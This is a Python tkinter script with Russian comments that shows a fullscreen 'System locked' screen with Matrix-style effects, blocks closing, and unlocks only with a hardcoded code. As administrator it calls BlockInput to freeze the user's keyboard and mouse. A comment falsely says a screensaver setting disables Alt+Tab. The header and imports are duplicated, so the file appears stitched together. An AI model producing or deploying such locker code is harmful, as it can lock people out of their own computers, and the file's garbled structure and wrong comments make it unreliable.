import tkinter as tk
from tkinter import messagebox
import random
import math

# === КОНФИГУРАЦИЯ === #
SECRET_CODE   = "zaizone21"
WINDOW_BG     = "#0A0A0A"
TEXT_COLOR    = "#00FFAA"
TAIL_COLOR    = "#003333"
GLOW_COLOR    = "#00FFCC"
FONT_MAIN     = ("Consolas", 36, "bold")
FONT_INPUT    = ("Consolas", 20)
import tkinter as tk
from tkinter import messagebox
import random
import math
import ctypes

# === БЛОКИРОВКА КЛАВИШ WIN и ALT+TAB === #
# Только работает при запуске от имени администратора
try:
    user32 = ctypes.windll.user32
    kernel32 = ctypes.windll.kernel32
    hwnd = user32.GetForegroundWindow()
    # Устанавливаем системный флаг, отключающий ALT+TAB, WIN и другие хоткеи
    SPI_SETSCREENSAVEACTIVE = 17
    user32.SystemParametersInfoW(SPI_SETSCREENSAVEACTIVE, 0, 0, 0)
    user32.BlockInput(True)  # Блокирует ввод с клавиатуры и мыши
except:
    print("⚠ Не удалось заблокировать клавиши. Запусти скрипт от имени администратора.")

# === КОНФИГУРАЦИЯ === #
SECRET_CODE   = "zaizone21"
WINDOW_BG     = "#0A0A0A"
TEXT_COLOR    = "#00FFAA"
TAIL_COLOR    = "#003333"
GLOW_COLOR    = "#00FFCC"
FONT_MAIN     = ("Consolas", 36, "bold")
FONT_INPUT    = ("Consolas", 20)
FONT_MATRIX   = ("Consolas", 14, "bold")
FRAME_BG      = "#151515"
BUTTON_BG     = "#006644"
BUTTON_ACTIVE = "#00AA77"
PARTICLE_COLORS = ["#00FF99", "#00FFCC", "#00FFFF", "#99FFCC"]

root = tk.Tk()
root.attributes("-fullscreen", True)
root.configure(bg=WINDOW_BG)
root.title("\U0001F512 Система заблокирована")
root.protocol("WM_DELETE_WINDOW", lambda: None)
root.resizable(False, False)

canvas = tk.Canvas(root, bg=WINDOW_BG, highlightthickness=0)
canvas.pack(fill="both", expand=True)

W, H = root.winfo_screenwidth(), root.winfo_screenheight()
FONT_SIZE = 16
COLUMNS = W // (FONT_SIZE * 3)

class MatrixColumn:
    def __init__(self, x):
        self.x = x
        self.speed = random.uniform(3, 6)
        self.length = random.randint(5, 15)
        self.ys = [(-i)*FONT_SIZE for i in range(self.length)]
        self.chars = [self.random_char() for _ in range(self.length)]
        tr, tg, tb = int(TEXT_COLOR[1:3],16), int(TEXT_COLOR[3:5],16), int(TEXT_COLOR[5:7],16)
        pr, pg, pb = int(TAIL_COLOR[1:3],16), int(TAIL_COLOR[3:5],16), int(TAIL_COLOR[5:7],16)
        self.colors = []
        for i in range(self.length):
            factor = 1.0 - (i/self.length)**1.5
            r = int(pr*(1-factor) + tr*factor)
            g = int(pg*(1-factor) + tg*factor)
            b = int(pb*(1-factor) + tb*factor)
            self.colors.append(f"#{r:02x}{g:02x}{b:02x}")
        self.items = [canvas.create_text(self.x, y, text=self.chars[i], font=FONT_MATRIX, fill=self.colors[i]) for i, y in enumerate(self.ys)]
        self.char_changes = [random.randint(15,40) for _ in range(self.length)]
        self.char_counters = [0]*self.length

    def random_char(self):
        return random.choice("アカサタナハマヤラワイキシチニヒミリヰウクスツヌフムユルエケセテネヘメレヱオコソトノホモヨロヲ0123456789█▓▒░")

    def update(self):
        for i, item in enumerate(self.items):
            self.char_counters[i] += 1
            if self.char_counters[i] >= self.char_changes[i]:
                self.char_counters[i] = 0
                self.char_changes[i] = random.randint(15,40)
                self.chars[i] = self.random_char()
                canvas.itemconfig(item, text=self.chars[i])
            y = self.ys[i] + self.speed
            if y > H + FONT_SIZE:
                y = -random.randint(50, 200)
                self.chars[i] = self.random_char()
                canvas.itemconfig(item, text=self.chars[i])
            self.ys[i] = y
            canvas.coords(item, self.x, y)

class Particle:
    def __init__(self, x, y):
        self.x = x
        self.y = y
        self.size = random.uniform(1,2)
        self.color = random.choice(PARTICLE_COLORS)
        self.speed = random.uniform(1,3)
        self.angle = random.uniform(0,math.pi*2)
        self.life = random.uniform(20,50)
        self.id = canvas.create_oval(x-self.size, y-self.size, x+self.size, y+self.size, fill=self.color, outline="")

    def update(self):
        self.x += math.cos(self.angle)*self.speed
        self.y += math.sin(self.angle)*self.speed
        self.life -= 1
        canvas.coords(self.id, self.x-self.size, self.y-self.size, self.x+self.size, self.y+self.size)
        if self.life < 10:
            r, g, b = [int(self.color[i:i+2], 16) for i in (1, 3, 5)]
            factor = self.life / 10
            r = max(0, min(255, int(r * factor)))
            g = max(0, min(255, int(g * factor)))
            b = max(0, min(255, int(b * factor)))
            canvas.itemconfig(self.id, fill=f"#{r:02x}{g:02x}{b:02x}")
        return self.life > 0

particles = []
MAX_PARTICLES = 150
button_active = False

def animate_matrix():
    for col in columns:
        col.update()
    root.after(50, animate_matrix)

def animate_particles():
    global particles
    particles = [p for p in particles if p.update()]
    if button_active and len(particles) < MAX_PARTICLES:
        try:
            bx = button.winfo_rootx() + button.winfo_width()//2
            by = button.winfo_rooty() + button.winfo_height()//2
            for _ in range(2):
                particles.append(Particle(bx+random.randint(-10,10), by+random.randint(-10,10)))
        except:
            pass
    root.after(30, animate_particles)

# === ИНТЕРФЕЙС === #
main_container = tk.Frame(root, bg="#111111", bd=0)
main_container.place(relx=0.5, rely=0.4, anchor="center", width=600, height=350)
frame = tk.Frame(main_container, bg=FRAME_BG, bd=0, highlightthickness=0)
frame.place(relx=0.5, rely=0.5, anchor="center", relwidth=0.97, relheight=0.95)
header_frame = tk.Frame(frame, bg=FRAME_BG, bd=0, pady=10)
header_frame.pack(fill="x")
content_frame = tk.Frame(frame, bg=FRAME_BG, bd=0, padx=30, pady=10)
content_frame.pack(fill="both", expand=True)
footer_frame = tk.Frame(frame, bg=FRAME_BG, bd=0, pady=10)
footer_frame.pack(fill="x")

shadow_text = "🔒 СИСТЕМА ЗАБЛОКИРОВАНА 🔒"
tk.Label(header_frame, text=shadow_text, font=FONT_MAIN, fg="#111111", bg=FRAME_BG).place(x=2, y=2)
label = tk.Label(header_frame, text=shadow_text, font=FONT_MAIN, fg=GLOW_COLOR, bg=FRAME_BG)
label.pack()
label2 = tk.Label(content_frame, text="Введите код для разблокировки:", font=FONT_INPUT, fg="#CCCCCC", bg=FRAME_BG)
label2.pack(pady=(0, 10))

def blink_label():
    try:
        c = label2.cget("fg")
        label2.config(fg="#AAAAAA" if c=="#CCCCCC" else "#CCCCCC")
        root.after(500, blink_label)
    except:
        pass
blink_label()

entry_frame = tk.Frame(content_frame, bg="#00FF99", bd=0)
entry_frame.pack(fill="x", pady=(0, 15))
entry = tk.Entry(entry_frame, font=FONT_INPUT, justify="center", show="*", fg="white", bg="#1A1A1A", insertbackground=GLOW_COLOR, relief="flat", bd=0, highlightthickness=0)
entry.pack(fill="x", padx=2, pady=2, ipady=6)

def pulse_entry(_=None):
    try:
        entry_frame.config(bg="#00FFCC")
        root.after(100, lambda: entry_frame.config(bg="#00FF99"))
    except:
        pass
entry.bind("<FocusIn>", pulse_entry)

button_frame = tk.Frame(footer_frame, bg="#00FF99", bd=0)
button_frame.pack(fill="x")

def on_enter(e):
    global button_active
    button_active = True
    try:
        button_frame.config(bg="#00FFCC")
        button.config(bg=BUTTON_ACTIVE, fg="black")
    except:
        pass

def on_leave(e):
    global button_active
    button_active = False
    try:
        button_frame.config(bg="#00FF99")
        button.config(bg=BUTTON_BG, fg="white")
    except:
        pass

button = tk.Button(button_frame, text="РАЗБЛОКИРОВАТЬ", font=FONT_INPUT, command=lambda: try_unlock(), bg=BUTTON_BG, fg="white", activebackground=BUTTON_ACTIVE, relief="flat", bd=0, padx=20, pady=8, highlightthickness=0)
button.pack(fill="x", padx=2, pady=2, ipady=4)
button.bind("<Enter>", on_enter)
button.bind("<Leave>", on_leave)

def try_unlock():
    try:
        if entry.get() == SECRET_CODE:
            bx = button.winfo_rootx() + button.winfo_width()//2
            by = button.winfo_rooty() + button.winfo_height()//2
            for _ in range(40):
                if len(particles) < MAX_PARTICLES:
                    particles.append(Particle(bx, by))
            def fade_out(alpha=1.0):
                if alpha > 0:
                    scale = 0.9 + (alpha * 0.1)
                    main_container.place_configure(relx=0.5, rely=0.4 - (0.1 * (1.0 - alpha)), width=int(600 * scale), height=int(350 * scale))
                    root.after(20, fade_out, alpha - 0.05)
                else:
                    main_container.destroy()
                    show_success()
            fade_out()
        else:
            entry.delete(0, 'end')
            entry_frame.config(bg="#FF3333")
            root.after(200, lambda: entry_frame.config(bg="#00FF99"))
            shake_frame()
    except Exception as e:
        print(f"Ошибка: {e}")

def shake_frame():
    try:
        orig_x, orig_y = main_container.winfo_x(), main_container.winfo_y()
        def shake(step=0):
            if step < 10:
                dx = random.randint(-5, 5)
                dy = random.randint(-5, 5)
                main_container.place_configure(x=orig_x + dx, y=orig_y + dy)
                root.after(40, shake, step + 1)
            else:
                main_container.place_configure(x=orig_x, y=orig_y)
        shake()
    except:
        pass

def show_success():
    success_text = "ДОСТУП РАЗРЕШЕН"
    for i in range(1, 3):
        canvas.create_text(W//2 + i, H//2 + i, text=success_text, font=("Consolas", 50, "bold"), fill="#111111", tags="success")
    txt = canvas.create_text(W//2, H//2, text=success_text, font=("Consolas", 50, "bold"), fill="#000000", tags="success")
    def fade_in(alpha=0.0):
        if alpha < 1.0:
            r = int(int(GLOW_COLOR[1:3],16) * alpha)
            g = int(int(GLOW_COLOR[3:5],16) * alpha)
            b = int(int(GLOW_COLOR[5:7],16) * alpha)
            color = f"#{r:02x}{g:02x}{b:02x}"
            canvas.itemconfig(txt, fill=color)
            root.after(20, fade_in, alpha + 0.05)
        else:
            expand_text()
    def expand_text(size=50):
        if size < 80:
            canvas.itemconfig("success", font=("Consolas", size, "bold"))
            root.after(20, expand_text, size + 2)
        else:
            fade_to_black()
    def fade_to_black(alpha=0.0):
        overlay = canvas.create_rectangle(0, 0, W, H, fill="#000000", stipple="gray25", tags="fade")
        def darken(a=alpha):
            if a < 1.0:
                gray = int(255 * a)
                hex_gray = f"#{gray:02x}{gray:02x}{gray:02x}"
                canvas.itemconfig("fade", fill=hex_gray)
                root.after(30, darken, a + 0.05)
            else:
                root.destroy()
        darken()
    fade_in()

# === ЗАПУСК === #
columns = [MatrixColumn(i*FONT_SIZE*3 + FONT_SIZE) for i in range(COLUMNS)]
animate_matrix()
animate_particles()
entry.focus_set()
root.mainloop()
